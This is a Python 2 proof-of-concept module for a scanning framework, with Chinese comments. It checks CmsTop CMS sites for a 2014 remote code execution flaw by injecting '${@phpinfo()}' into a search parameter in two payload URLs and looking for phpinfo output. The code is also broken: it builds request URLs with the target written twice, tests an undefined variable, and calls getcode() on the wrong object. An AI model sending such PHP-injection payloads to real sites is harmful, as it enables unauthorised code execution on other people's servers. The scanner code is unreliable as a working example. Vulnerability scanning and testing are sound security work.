# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'CmsTop_0001' # 平台漏洞编号，留空
    name = 'CmsTop 远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2014-03-27'  # 漏洞公布时间
    desc = '''
        CmsTop /domain.com/app/?, /app.domain.com/? 存在远程代码执行漏洞
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'CmsTop'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '90b2af13-dbf4-4541-ae45-7f5a059d8f25'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer: http://www.wooyun.org/bugs/wooyun-2014-054693
            #获取域名
            url = self.target
            domain_name = url.split('www')[-1]
            #print(domain_name)
            payloads = [
                'http://app' + domain_name + '/?app=search&controller=index&id=$page&action=search&wd=a&test=${@phpinfo()}',
                self.target + '/app/?app=search&controller=index&id=$page&action=search&wd=a&test=${@phpinfo()}'
            ]
            for payload in payloads:
                print(payload)
                verify_url = self.target + payload
                req = urllib2.Request(verify_url)
                content = urllib2.urlopen(req).read()

                if req.getcode() == 200 and 'PHP Version' in res and 'Configure Command' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
